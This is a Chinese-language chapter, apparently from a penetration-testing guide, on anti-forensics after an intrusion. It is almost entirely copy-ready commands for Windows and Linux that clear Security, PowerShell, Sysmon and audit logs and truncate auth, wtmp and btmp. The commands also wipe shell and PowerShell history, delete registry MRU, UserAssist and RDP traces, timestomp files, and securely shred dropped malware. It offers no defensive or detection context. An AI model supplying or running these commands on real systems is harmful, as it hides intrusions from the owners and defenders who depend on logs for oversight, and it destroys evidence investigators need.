# 痕迹清理与反取证

### 8.1 Windows痕迹清理

```
痕迹清理范围：

1. 事件日志清理
   ├── 安全日志 (Security)
   ├── 系统日志 (System)
   ├── 应用程序日志 (Application)
   ├── PowerShell日志
   ├── Windows Defender日志
   └── Sysmon日志

2. 文件系统痕迹
   ├── 恶意文件删除
   ├── 临时文件清理
   ├── Prefetch清理
   ├── 日志文件删除
   └── 恶意文件时间戳修改

3. 注册表痕迹
   ├── 运行键清理
   ├── 用户辅助记录清理
   ├── 最近文档清理
   └── MRU列表清理

4. 网络痕迹
   ├── RDP缓存清理
   ├── 网络共享历史
   └── 远程连接记录

5. 应用程序痕迹
   ├── 浏览器历史
   ├── 下载记录
   ├── 最近文件
   └── 命令历史
```

#### 痕迹清理命令

```bash
# 1. 清理Windows事件日志
# 清除所有日志
wevtutil el | ForEach-Object { wevtutil cl "$_" }

# 清除特定日志
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"

# 2. 清理Prefetch
del /f /q C:\Windows\Prefetch\*.pf

# 3. 清理临时文件
del /f /q %TEMP%\*
del /f /q %WINDIR%\Temp\*
del /f /q C:\Windows\Temp\*

# 4. 清理注册表痕迹
# 清理最近文档
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
# 清理运行历史
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
# 清理用户辅助记录
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f

# 5. 清理RDP缓存
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /f
reg delete "HKCU\Software\Microsoft\Terminal Server Client\Servers" /f

# 6. 清理PowerShell历史
Remove-Item (Get-PSReadlineOption).HistorySavePath
del /f /q %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 7. 时间戳修改 (Timestomp)
# 使用PowerShell修改文件时间
(Get-Item "file.exe").CreationTime = "2026-01-01 00:00:00"
(Get-Item "file.exe").LastWriteTime = "2026-01-01 00:00:00"
(Get-Item "file.exe").LastAccessTime = "2026-01-01 00:00:00"

# 8. 安全删除文件
# 使用sdelete进行安全删除
sdelete -p 3 -accepteula "file.exe"
```

### 8.2 Linux痕迹清理

```bash
# 1. 清理命令历史
history -c
echo "" > ~/.bash_history
echo "" > ~/.zsh_history
unset HISTFILE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0

# 2. 清理日志
# 注意：直接删除日志会引起注意
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > ~/.bash_history

# 3. 清理临时文件
rm -rf /tmp/.*
rm -rf /var/tmp/*

# 4. 清理SSH痕迹
echo "" > ~/.bash_history
# 清理known_hosts
echo "" > ~/.ssh/known_hosts

# 5. 时间戳修改
touch -t 202601010000 file
touch -a -t 202601010000 file  # 访问时间
touch -m -t 202601010000 file  # 修改时间

# 6. 安全删除
shred -vfz -n 3 file
# 或
dd if=/dev/urandom of=file bs=1M count=$(stat -c%s file)
rm -f file

# 7. 清理进程痕迹
# 清理/proc信息
# 清理进程日志
# 清理audit日志
cat /dev/null > /var/log/audit/audit.log
```
